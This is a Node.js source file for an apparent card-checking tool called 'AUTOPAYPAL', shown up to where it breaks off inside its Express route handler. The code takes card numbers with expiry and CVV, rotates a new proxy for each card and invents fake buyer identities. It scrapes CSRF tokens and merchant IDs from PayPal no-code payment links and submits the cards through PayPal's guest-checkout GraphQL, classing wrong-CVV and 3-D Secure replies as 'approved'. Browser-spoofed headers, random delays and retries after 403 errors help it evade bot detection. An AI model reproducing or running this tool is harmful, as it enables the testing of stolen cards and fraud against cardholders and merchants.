// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
const express = require('express');
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
const axios = require('axios');
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
const { HttpsProxyAgent } = require('https-proxy-agent');
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
const fs = require('fs');
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
const path = require('path');
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
const { v4: uuidv4 } = require('uuid');

// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
// Configure logging
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
const log = {
    info: (msg) => console.log(`[${new Date().toISOString()}] [INFO] ${msg}`),
    warn: (msg) => console.warn(`[${new Date().toISOString()}] [WARN] ${msg}`),
    error: (msg) => console.error(`[${new Date().toISOString()}] [ERROR] ${msg}`),
    debug: (msg) => console.log(`[${new Date().toISOString()}] [DEBUG] ${msg}`)
};

// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
// Initialize Express App
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
const app = express();
app.use(express.json());

// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
// --- Proxy Management ---
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
let proxyList = [];
let proxyIndex = 0;

// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
// --- Status Mapping Rules ---
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
const APPROVED_CODES = new Set(['INVALID_SECURITY_CODE', '3D SECURE']);

// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
// --- Load Proxies ---
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
function loadProxiesFromFile() {
    try {
        const filepath = path.join(__dirname, 'px.txt');
        log.info(`Looking for file: ${filepath}`);

        if (!fs.existsSync(filepath)) {
            log.warn('px.txt NOT FOUND');
            return;
        }

        const content = fs.readFileSync(filepath, 'utf-8');
        const lines = content.split('\n');

        for (const line of lines) {
            const trimmed = line.trim();
            if (!trimmed || trimmed.startsWith('#')) continue;
            proxyList.push(trimmed);
        }

        log.info(`Successfully loaded ${proxyList.length} proxies`);
    } catch (e) {
        log.error(`Proxy load error: ${e.message}`);
    }
}

// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
// --- Get Next Proxy (Round Robin) ---
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
function getNextProxy() {
    if (proxyList.length === 0) {
        log.warn('Proxy list empty');
        return null;
    }
    const proxyString = proxyList[proxyIndex % proxyList.length];
    proxyIndex++;
    return proxyString;
}

// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
// --- Parse Proxy String ---
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
function parseProxyString(proxyString) {
    try {
        proxyString = proxyString.trim();

        if (proxyString.startsWith('http://') || proxyString.startsWith('https://')) {
            return proxyString;
        }

        if (proxyString.includes('@')) {
            return `http://${proxyString}`;
        }

        const parts = proxyString.split(':');

        if (parts.length === 4) {
            const [ip, port, user, password] = parts;
            return `http://${user}:${password}@${ip}:${port}`;
        } else if (parts.length === 2) {
            const [ip, port] = parts;
            return `http://${ip}:${port}`;
        } else {
            throw new Error('Unsupported proxy format');
        }
    } catch (e) {
        log.error(`Failed parsing proxy '${proxyString}': ${e.message}`);
        throw new Error(`Could not parse proxy: ${e.message}`);
    }
}

// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
// --- Generate User Details ---
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
function generateUserDetails() {
    const firstNames = ['James', 'Mary', 'John', 'Patricia', 'Robert', 'Jennifer', 'Michael', 'Linda', 'William', 'Elizabeth', 'David', 'Barbara', 'Richard', 'Susan', 'Joseph', 'Jessica'];
    const lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Gonzalez', 'Wilson', 'Anderson'];

    const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];

    const emailUser = Array.from({ length: 10 }, () => 'abcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 36)]).join('');
    const emailDomains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'aol.com'];
    const email = `${emailUser}@${emailDomains[Math.floor(Math.random() * emailDomains.length)]}`;

    const phoneNumber = `${Math.floor(Math.random() * 800) + 200}${Math.floor(Math.random() * 800) + 200}${Math.floor(Math.random() * 9000) + 1000}`;
    const streetNumber = Math.floor(Math.random() * 9999) + 1;
    const streetNames = ['Main', 'Oak', 'Pine', 'Maple', 'Cedar', 'Elm', 'Washington', 'Park', 'Walnut', 'Lake'];
    const streetTypes = ['St', 'Ave', 'Dr', 'Ln', 'Blvd', 'Ct'];

    const validUsAddresses = [
        { city: 'New York', state: 'NY', postalCode: '10001' },
        { city: 'Los Angeles', state: 'CA', postalCode: '90001' },
        { city: 'Chicago', state: 'IL', postalCode: '60601' },
        { city: 'Houston', state: 'TX', postalCode: '77001' },
        { city: 'Phoenix', state: 'AZ', postalCode: '85001' },
        { city: 'Philadelphia', state: 'PA', postalCode: '19101' },
        { city: 'San Antonio', state: 'TX', postalCode: '78201' },
        { city: 'San Diego', state: 'CA', postalCode: '92101' },
        { city: 'Dallas', state: 'TX', postalCode: '75201' },
        { city: 'San Jose', state: 'CA', postalCode: '95101' },
    ];
    const chosenAddress = validUsAddresses[Math.floor(Math.random() * validUsAddresses.length)];
    const streetName = streetNames[Math.floor(Math.random() * streetNames.length)];
    const streetType = streetTypes[Math.floor(Math.random() * streetTypes.length)];

    return {
        firstName,
        lastName,
        email,
        phoneNumber,
        address: {
            line1: `${streetNumber} ${streetName} ${streetType}`,
            city: chosenAddress.city,
            state: chosenAddress.state,
            postalCode: chosenAddress.postalCode,
            country: 'US'
        }
    };
}

// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
// --- Extract CSRF Token ---
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
function extractCsrfToken(htmlContent) {
    const patterns = [
        /"csrfToken":"([^"]+)"/,
        /csrfToken["']?\s*:\s*["']([^"']+)["']/,
        /name=["']csrf["']\s+value=["']([^"']+)["']/,
        /data-csrf=["']([^"']+)["']/,
        /"token":"([^"]+)"/,
        /name="_token"\s+value="([^"]+)"/,
        /window\.csrfToken\s*=\s*["']([^"']+)["']/,
        /X-CSRF-TOKEN["']?\s*:\s*["']([^"']+)["']/,
        /data-token=["']([^"']+)["']/,
        /content="([^"]+)"\s+name="_csrf"/,
        /"csrf"\s*:\s*"([^"]+)"/
    ];

    for (const pattern of patterns) {
        const match = htmlContent.match(pattern);
        if (match) {
            return match[1];
        }
    }
    return null;
}

// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
// --- Extract Page Metadata ---
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
function extractPageMetadata(htmlContent) {
    let merchantId = null;
    let amount = '1';
    let currency = 'USD';
    let currencySymbol = '$';

    // Extract merchant_id - multiple patterns
    const merchantPatterns = [
        /"name"\s*:\s*"business"\s*,\s*"value"\s*:\s*"([^"]+)"/,
        /"merchant_id"\s*:\s*"([^"]+)"/,
        /"sellerId"\s*:\s*"([^"]+)"/,
        /merchant_id=([^"&]+)/,
        /"business"\s*:\s*"([^"]+)"/
    ];

    for (const pattern of merchantPatterns) {
        const match = htmlContent.match(pattern);
        if (match) {
            merchantId = match[1];
            break;
        }
    }

    // Extract amount
    const amountMatch = htmlContent.match(/"name"\s*:\s*"amount"\s*,\s*"value"\s*:\s*"([^"]+)"/);
    if (amountMatch) {
        amount = amountMatch[1];
    }

    // Extract currency
    const currencyMatch = htmlContent.match(/"name"\s*:\s*"currency"\s*,\s*"value"\s*:\s*"([^"]+)"/);
    if (currencyMatch) {
        currency = currencyMatch[1].toUpperCase();
        const symbols = { USD: '$', EUR: '€', GBP: '£', CAD: 'C$', AUD: 'A$' };
        currencySymbol = symbols[currency] || '$';
    }

    return { merchantId, amount, currency, currencySymbol };
}

// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
// --- Extract Link ID ---
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
function extractLinkId(siteUrl) {
    try {
        const cleanUrl = siteUrl.replace(/\/+$/, '');
        const parts = cleanUrl.split('/');
        const linkId = parts[parts.length - 1];
        if (linkId && linkId.length > 5) {
            return linkId;
        }
        return null;
    } catch (e) {
        return null;
    }
}

// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
// --- Sleep Utility ---
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
// --- Random Delay ---
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
function randomDelay(min, max) {
    return sleep(Math.floor(Math.random() * (max - min) + min));
}

// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
// --- Create Axios Instance with Proxy ---
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
function createAxiosInstance(proxyUrl, cookies = {}) {
    const config = {
        timeout: 25000,
        maxRedirects: 5,
        validateStatus: () => true,
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
        },
        headersSerializer: (headers) => headers,
    };

    if (proxyUrl) {
        config.httpsAgent = new HttpsProxyAgent(proxyUrl, {
            rejectUnauthorized: false
        });
    }

    if (Object.keys(cookies).length > 0) {
        config.headers['Cookie'] = Object.entries(cookies)
            .map(([k, v]) => `${k}=${v}`)
            .join('; ');
    }

    return axios.create(config);
}

// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
// --- Safe Request Wrapper ---
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
async function safeRequest(instance, method, url, options = {}) {
    const timeout = options.timeout || { connectTimeout: 8000, timeout: 20000 };

    try {
        const response = await instance({
            method,
            url,
            ...options,
            timeout: timeout.timeout || 20000
        });
        return { response, error: null };
    } catch (e) {
        if (e.code === 'ECONNABORTED' || e.code === 'ETIMEDOUT') {
            return { response: null, error: 'TIMEOUT' };
        }
        if (e.code === 'ECONNREFUSED' || e.code === 'ENOTFOUND' || e.code === 'ECONNRESET') {
            return { response: null, error: 'NETWORK_ERROR' };
        }
        if (e.message && e.message.includes('proxy')) {
            return { response: null, error: 'PROXY_ERROR' };
        }
        if (e.message && (e.message.includes('SSL') || e.message.includes('certificate'))) {
            return { response: null, error: 'SSL_ERROR' };
        }
        return { response: null, error: 'NETWORK_ERROR' };
    }
}

// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
// --- Extract Token from Response ---
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
function extractTokenFromResponse(responseData) {
    // Primary field: context_id
    if (responseData.context_id) {
        return responseData.context_id;
    }

    // Fallback fields
    if (responseData.id) {
        return responseData.id;
    }

    if (responseData.order_id) {
        return responseData.order_id;
    }

    if (responseData.token) {
        return responseData.token;
    }

    if (responseData.orderToken) {
        return responseData.orderToken;
    }

    if (responseData.ec_token) {
        return responseData.ec_token;
    }

    // Check nested data object
    if (responseData.data) {
        if (responseData.data.context_id) return responseData.data.context_id;
        if (responseData.data.id) return responseData.data.id;
        if (responseData.data.token) return responseData.data.token;
        if (responseData.data.order_id) return responseData.data.order_id;
    }

    // Check nested order object
    if (responseData.order) {
        if (responseData.order.id) return responseData.order.id;
        if (responseData.order.token) return responseData.order.token;
    }

    // Check for PayPal token in links
    if (responseData.links && Array.isArray(responseData.links)) {
        for (const link of responseData.links) {
            if (link.href && link.href.includes('token=')) {
                const match = link.href.match(/token=([^&]+)/);
                if (match) return match[1];
            }
        }
    }

    return null;
}

// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
// --- Main Payment Processing Function ---
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
async function processPaypalPayment(cardDetailsString, proxyConfig, siteUrl) {
    const linkId = extractLinkId(siteUrl);
    if (!linkId) {
        return {
            status: 'declined',
            code: 'VALIDATION_ERROR',
            message: 'Could not extract valid link_id from site URL.'
        };
    }

    log.info(`Extracted link_id: ${linkId} from site: ${siteUrl}`);

    // Parse card details
    const parts = cardDetailsString.split('|');
    if (parts.length !== 4) {
        return {
            status: 'declined',
            code: 'VALIDATION_ERROR',
            message: 'Invalid input format. Expected: card_number|mm|yy|cvv'
        };
    }

    const [cardNumber, month, year, cvv] = parts.map(p => p.trim());

    // Validate month
    if (!/^\d{2}$/.test(month) || !(parseInt(month) >= 1 && parseInt(month) <= 12)) {
        return { status: 'declined', code: 'INVALID_MONTH', message: 'Invalid expiration month provided.' };
    }

    // Validate year
    if (!/^\d+$/.test(year)) {
        return { status: 'declined', code: 'VALIDATION_ERROR', message: 'Invalid expiration year format.' };
    }

    let formattedYear = year;
    if (year.length === 2) {
        formattedYear = '20' + year;
    } else if (year.length !== 4) {
        return { status: 'declined', code: 'VALIDATION_ERROR', message: 'Invalid expiration year format.' };
    }

    // Validate CVV
    if (!/^\d{3,4}$/.test(cvv)) {
        return { status: 'declined', code: 'VALIDATION_ERROR', message: 'Invalid CVV format.' };
    }

    const expiryDate = `${month}/${formattedYear}`;
    const cardType = cardNumber.startsWith('4') ? 'VISA' :
        (cardNumber.startsWith('5') ? 'MASTER_CARD' :
            (cardNumber.startsWith('3') ? 'AMEX' : 'UNKNOWN'));
    const currencyConversionType = cardType === 'AMEX' ? 'VENDOR' : 'PAYPAL';

    const cardDetails = {
        cardNumber,
        type: cardType,
        expirationDate: expiryDate,
        securityCode: cvv,
        postalCode: '10010'
    };

    const userDetails = generateUserDetails();
    log.info(`Processing payment for user: ${userDetails.firstName} ${userDetails.lastName} (${userDetails.email})`);

    // Create axios instance with proxy
    const instance = createAxiosInstance(proxyConfig);

    let token = null;
    let csrfToken = null;
    let merchantId = null;
    let amount = '1';
    let currency = 'USD';
    let currencySymbol = '$';
    let cookies = {};

    const maxRetries = 3;

    for (let attempt = 0; attempt < maxRetries; attempt++) {
        log.info(`Token acquisition attempt ${attempt + 1}/${maxRetries}`);

        if (attempt > 0) {
            const retryDelay = 500 + (attempt * 500) + Math.floor(Math.random() * 300);
            log.info(`Waiting ${retryDelay}ms before retry...`);
            await sleep(retryDelay);
        }

        // ============================================
        // --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
        // STEP 1: Fetch CSRF Token & Page Metadata
        // --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
        // ============================================
        try {
            const headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Upgrade-Insecure-Requests': '1',
            };

            const { response, error } = await safeRequest(instance, 'get', siteUrl, {
                headers,
                timeout: 20000
            });

            if (error) {
                log.warn(`Error fetching page: ${error}. Attempt ${attempt + 1}/${maxRetries}`);
                continue;
            }

            if (response.status !== 200) {
                log.warn(`Unexpected status ${response.status} fetching page. Attempt ${attempt + 1}/${maxRetries}`);
                continue;
            }

            // Extract cookies from response
            if (response.headers['set-cookie']) {
                const setCookies = Array.isArray(response.headers['set-cookie'])
                    ? response.headers['set-cookie']
                    : [response.headers['set-cookie']];
                for (const cookie of setCookies) {
                    const match = cookie.match(/^([^=]+)=([^;]+)/);
                    if (match) {
                        cookies[match[1]] = match[2];
                    }
                }
            }

            csrfToken = extractCsrfToken(response.data);
            if (!csrfToken) {
                log.warn('Could not extract CSRF token from page. Retrying...');
                continue;
            }

            // DYNAMICALLY EXTRACT MERCHANT ID, AMOUNT, AND CURRENCY
            const metadata = extractPageMetadata(response.data);
            merchantId = metadata.merchantId;
            amount = metadata.amount;
            currency = metadata.currency;
            currencySymbol = metadata.currencySymbol;

            if (!merchantId) {
                log.warn('Could not extract merchant_id from page. Retrying...');
                continue;
            }

            log.info(`Successfully extracted CSRF token and Merchant ID: ${merchantId} (Amount: ${amount} ${currency})`);

        } catch (e) {
            log.warn(`Unexpected error fetching CSRF token: ${e.message}. Retrying...`);
            continue;
        }

        await randomDelay(100, 200);

        // ============================================
        // --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
        // STEP 2: Create Order
        // --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
        // ============================================
        try {
            // Update instance with cookies
            const cookieHeader = Object.entries(cookies)
                .map(([k, v]) => `${k}=${v}`)
                .join('; ');

            const headers = {
                'accept': '*/*',
                'content-type': 'application/json',
                'origin': 'https://www.paypal.com',
                'referer': siteUrl,
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'x-csrf-token': csrfToken,
                'x-requested-with': 'XMLHttpRequest',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'Connection': 'keep-alive',
                'Cookie': cookieHeader,
            };

            const jsonData = {
                link_id: linkId,
                merchant_id: merchantId,
                quantity: '1',
                amount: amount,
                currency: currency,
                currencySymbol: currencySymbol,
                funding_source: 'CARD',
                button_type: 'VARIABLE_PRICE',
                csrfRetryEnabled: true,
            };

            let { response, error } = await safeRequest(instance, 'post', 'https://www.paypal.com/ncp/api/create-order', {
                headers,
                data: jsonData,
                timeout: 25000
            });

            if (error) {
                log.warn(`Error creating order: ${error}. Attempt ${attempt + 1}/${maxRetries}`);
                continue;
            }

            // Handle CSRF mismatch - retry with new token
            if (response.status === 202) {
                try {
                    const retryData = response.data;
                    if (retryData.message === 'CSRF_MISMATCH_RETRY' && retryData.csrfToken) {
                        log.info('CSRF mismatch detected. Retrying with new token...');
                        headers['x-csrf-token'] = retryData.csrfToken;
                        await randomDelay(150, 250);

                        const retryResult = await safeRequest(instance, 'post', 'https://www.paypal.com/ncp/api/create-order', {
                            headers,
                            data: jsonData,
                            timeout: 25000
                        });
                        response = retryResult.response;
                        error = retryResult.error;

                        if (error) {
                            log.warn(`CSRF retry failed: ${error}`);
                            continue;
                        }
                    }
                } catch (e) {
                    log.error(`Failed to parse CSRF retry response: ${e.message}`);
                }
            }

            if (response.status === 429) {
                if (attempt < maxRetries - 1) {
                    const retryDelay = Math.floor(Math.random() * 8000) + 12000;
                    log.warn(`Rate limited (429). Waiting ${retryDelay}ms before retry...`);
                    await sleep(retryDelay);
                    continue;
                } else {
                    return {
                        status: 'declined',
                        code: 'RATE_LIMIT_REACHED',
                        message: 'PayPal API rate limit exceeded after multiple retries.'
                    };
                }
            }

            if (response.status >= 500) {
                if (attempt < maxRetries - 1) {
                    const retryDelay = Math.floor(Math.random() * 1500) + 1000;
                    log.warn(`Server error ${response.status}. Waiting ${retryDelay}ms before retry...`);
                    await sleep(retryDelay);
                    continue;
                } else {
                    return {
                        status: 'declined',
                        code: 'NETWORK_ERROR',
                        message: `PayPal server error: ${response.status}`
                    };
                }
            }

            if (response.status === 422) {
                log.error(`Validation error (422) from create-order: ${JSON.stringify(response.data).substring(0, 300)}`);
                return {
                    status: 'declined',
                    code: 'VALIDATION_ERROR',
                    message: `PayPal rejected the request parameters: ${JSON.stringify(response.data).substring(0, 200)}`
                };
            }

            if (response.status === 403) {
                log.error(`Forbidden (403) from create-order - possible bot detection`);
                if (attempt < maxRetries - 1) {
                    await randomDelay(2000, 3000);
                    continue;
                } else {
                    return {
                        status: 'declined',
                        code: 'FORBIDDEN',
                        message: 'PayPal blocked the request (possible bot detection)'
                    };
                }
            }

            if (response.status !== 200) {
                log.error(`Unexpected status ${response.status} from create-order: ${JSON.stringify(response.data).substring(0, 300)}`);
                if (attempt < maxRetries - 1) {
                    continue;
                } else {
                    return {
                        status: 'declined',
                        code: 'NETWORK_ERROR',
                        message: `Unexpected response: ${response.status}`
                    };
                }
            }

            // Parse response data
            let responseData;
            if (typeof response.data === 'string') {
                try {
                    responseData = JSON.parse(response.data);
                } catch (e) {
                    log.error(`Failed to parse create-order JSON: ${e.message}`);
                    if (attempt < maxRetries - 1) {
                        continue;
                    } else {
                        return {
                            status: 'declined',
                            code: 'INTERNAL_ERROR',
                            message: 'Invalid JSON response from PayPal.'
                        };
                    }
                }
            } else {
                responseData = response.data;
            }

            // Try multiple token extraction methods
            token = extractTokenFromResponse(responseData);

            if (token) {
                log.info(`Successfully extracted token: ${token.substring(0, 20)}...`);
                break;
            } else {
                log.error(`No token in response. Response keys: ${Object.keys(responseData).join(', ')}`);
                log.debug(`Full response: ${JSON.stringify(responseData).substring(0, 500)}`);
            }

        } catch (e) {
            log.error(`Unexpected error during create-order: ${e.message}`);
            if (attempt < maxRetries - 1) {
                continue;
            } else {
                return {
                    status: 'declined',
                    code: 'INTERNAL_ERROR',
                    message: 'Unexpected error during payment processing.'
                };
            }
        }
    }

    if (!token) {
        log.error(`Failed to extract token after ${maxRetries} attempts.`);
        return {
            status: 'declined',
            code: 'TOKEN_EXTRACTION_ERROR',
            message: 'Failed to extract token from PayPal after multiple retries.'
        };
    }

    // ============================================
    // --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
    // STEP 3: Submit Payment via GraphQL
    // --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
    // ============================================
    await randomDelay(150, 300);

    try {
        // Update instance with cookies for GraphQL request
        const cookieHeader = Object.entries(cookies)
            .map(([k, v]) => `${k}=${v}`)
            .join('; ');

        const headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': 'https://www.paypal.com',
            'paypal-client-context': token,
            'paypal-client-metadata-id': token,
            'referer': `https://www.paypal.com/smart/card-fields?token=${token}`,
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'x-app-name': 'standardcardfields',
            'x-country': 'US',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'Connection': 'keep-alive',
            'Cookie': cookieHeader,
        };

        const graphqlQuery = `
        mutation payWithCard(
            $token: String!
            $card: CardInput
            $paymentToken: String
            $phoneNumber: String
            $firstName: String
            $lastName: String
            $shippingAddress: AddressInput
            $billingAddress: AddressInput
            $email: String
            $currencyConversionType: CheckoutCurrencyConversionType
            $installmentTerm: Int
            $identityDocument: IdentityDocumentInput
            $feeReferenceId: String
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token
                card: $card
                paymentToken: $paymentToken
                phoneNumber: $phoneNumber
                firstName: $firstName
                lastName: $lastName
                email: $email
                shippingAddress: $shippingAddress
                billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
                installmentTerm: $installmentTerm
                identityDocument: $identityDocument
                feeReferenceId: $feeReferenceId
            ) {
                flags {
                    is3DSecureRequired
                }
                cart {
                    intent
                    cartId
                    buyer {
                        userId
                        auth {
                            accessToken
                        }
                    }
                    returnUrl {
                        href
                    }
                }
            }
        }
        `;

        const jsonData = {
            query: graphqlQuery.trim(),
            variables: {
                token: token,
                card: cardDetails,
                phoneNumber: userDetails.phoneNumber,
                firstName: userDetails.firstName,
                lastName: userDetails.lastName,
                billingAddress: userDetails.address,
                shippingAddress: userDetails.address,
                email: userDetails.email,
                currencyConversionType: currencyConversionType,
            },
            operationName: null,
        };

        const maxGraphqlRetries = 2;
        let graphqlResponse = null;

        for (let graphqlAttempt = 0; graphqlAttempt < maxGraphqlRetries; graphqlAttempt++) {
            if (graphqlAttempt > 0) {
                const retryDelay = Math.floor(Math.random() * 300) + 300;
                log.info(`GraphQL retry ${graphqlAttempt + 1}/${maxGraphqlRetries}. Waiting ${retryDelay}ms...`);
                await sleep(retryDelay);
            }

            const { response, error } = await safeRequest(instance, 'post', 'https://www.paypal.com/graphql?fetch_credit_form_submit', {
                headers,
                data: jsonData,
                timeout: 30000
            });

            if (error) {
                log.warn(`GraphQL request failed: ${error}. Attempt ${graphqlAttempt + 1}/${maxGraphqlRetries}`);
                if (graphqlAttempt < maxGraphqlRetries - 1) {
                    continue;
                } else {
                    return {
                        status: 'declined',
                        code: error,
                        message: `Failed to submit payment: ${error}`
                    };
                }
            }

            if (response.status >= 500) {
                log.warn(`GraphQL server error: ${response.status}. Attempt ${graphqlAttempt + 1}/${maxGraphqlRetries}`);
                if (graphqlAttempt < maxGraphqlRetries - 1) {
                    continue;
                } else {
                    return {
                        status: 'declined',
                        code: 'NETWORK_ERROR',
                        message: `PayPal server error: ${response.status}`
                    };
                }
            }

            graphqlResponse = response;
            break;
        }

        if (!graphqlResponse) {
            return {
                status: 'declined',
                code: 'INTERNAL_ERROR',
                message: 'Failed to submit payment after retries.'
            };
        }

        let responseJson;

        if (typeof graphqlResponse.data === 'string') {
            try {
                responseJson = JSON.parse(graphqlResponse.data);
            } catch (e) {
                log.error(`Failed to parse GraphQL JSON: ${e.message}. Response: ${graphqlResponse.data.substring(0, 300)}`);
                return {
                    status: 'declined',
                    code: 'INTERNAL_ERROR',
                    message: 'Invalid JSON response from PayPal.'
                };
            }
        } else {
            responseJson = graphqlResponse.data;
        }

        // Check for errors
        if (responseJson.errors && responseJson.errors.length > 0) {
            const errorData = responseJson.errors[0];
            log.error(`PayPal error response: ${JSON.stringify(responseJson)}`);

            let errorMessage = errorData.message || 'An unknown error occurred.';
            let errorCode = errorData.extensions?.code;

            if (!errorCode) {
                const dataField = errorData.data;
                if (Array.isArray(dataField) && dataField.length > 0) {
                    errorCode = dataField[0].code;
                }
            }

            if (!errorCode) {
                errorCode = errorMessage;
            }

            if (APPROVED_CODES.has(errorCode)) {
                log.info(`PayPal transaction APPROVED - code: ${errorCode}`);
                return {
                    status: 'approved',
                    code: errorCode,
                    message: errorMessage
                };
            } else {
                if (!errorCode) errorCode = 'UNKNOWN_ERROR';
                log.error(`PayPal transaction DECLINED - Code: ${errorCode}, Message: ${errorMessage}`);
                return {
                    status: 'declined',
                    code: errorCode,
                    message: errorMessage
                };
            }
        }

        // Check for success data
        if (responseJson.data && responseJson.data.approveGuestPaymentWithCreditCard) {
            const logData = JSON.parse(JSON.stringify(responseJson));
            if (logData.data.approveGuestPaymentWithCreditCard.cart) {
                logData.data.approveGuestPaymentWithCreditCard.cart = { cartId: '[REDACTED]' };
            }
            log.info(`PayPal success response: ${JSON.stringify(logData)}`);

            const successData = responseJson.data.approveGuestPaymentWithCreditCard;
            const flags = successData.flags || {};

            if (flags.is3DSecureRequired) {
                log.info('PayPal transaction APPROVED - 3D Secure required');
                return {
                    status: 'approved',
                    code: '3D SECURE',
                    message: '3D Secure authentication required'
                };
            }

            const cartId = successData.cart?.cartId || 'N/A';
            log.info(`PayPal transaction CHARGED - Cart ID: ${cartId}`);
            return {
                status: 'charged',
                code: 'Payment Approved',
                message: 'Payment approved.'
            };
        }

        log.error(`Unknown PayPal response format: ${JSON.stringify(responseJson).substring(0, 500)}`);
        return {
            status: 'declined',
            code: 'UNKNOWN_RESPONSE_FORMAT',
            message: 'Received an unrecognized response from PayPal.'
        };

    } catch (e) {
        log.error(`GraphQL error: ${e.message}`);
        return {
            status: 'declined',
            code: 'INTERNAL_ERROR',
            message: `GraphQL processing error: ${e.message}`
        };
    }
}

// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
// --- Route Handlers ---
// --- AUTOPAYPAL BY - @ccnfy / @rnrxx ---
app.get('/paypal/auto', async (req, res) => {
    const { site, cc } = req.query;

    if (!site) {
        return res.status(400).json({
            status: 'declined',
            code: 'VALIDATION_ERROR',
            message: 'Missing site parameter. Usage: /paypal/auto?site={paypal_ncp_url}&cc={card|mm|yy|cvv}'
        });
    }

    if (!cc) {
        return res.status(400).json({
            status: 'declined',
            code: 'VALIDATION_ERROR',
            message: 'Missing cc parameter. Usage: /paypal/auto?site={paypal_ncp_url}&cc={card|mm|yy|cvv}'
        });
    }

    // Validate site URL format (should be PayPal NCP type)
    if (!site.includes('paypal.com/ncp/payment/')) {
        return res.status(400).json({
            status: 'declined',
            code: 'VALIDATION_ERROR',
            message: 'Invalid site URL. Must be a PayPal NCP payment link (paypal.com/ncp/payment/...)'
        });
    }

    const siteUrl = site;

    // Get NEW proxy for EVERY card request
    const proxyString = getNextProxy();

    if (!proxyString) {
        log.error('No proxies available');
        return res.status(503).json({
            status: 'declined',
            code: 'NETWORK_ERROR',
            message: 'No proxies available. Place px.txt in root directory (/px.txt).'
        });
    }

    let proxyConfig;
    try {
        proxyConfig = parseProxyString(proxyString);
        log.info(`Using proxy: ${proxyString.substring(0, 50)}...`);
    } catch (e) {
        log.error(`Failed to parse proxy: ${e.message}`);
        return res.status(503).json({
            status: 'declined',
            code: 'NETWORK_ERROR',
            message: e.message
        });
    }

    const cardParts = cc.split('|');
    const lastFour = (cardParts.length > 0 && cardParts[0].length >= 4) ? cardParts[0].slice(-4) : '****';
    log.info(`Received payment request - Site: ${siteUrl} - Card ending in: ${lastFour}`);

    try {
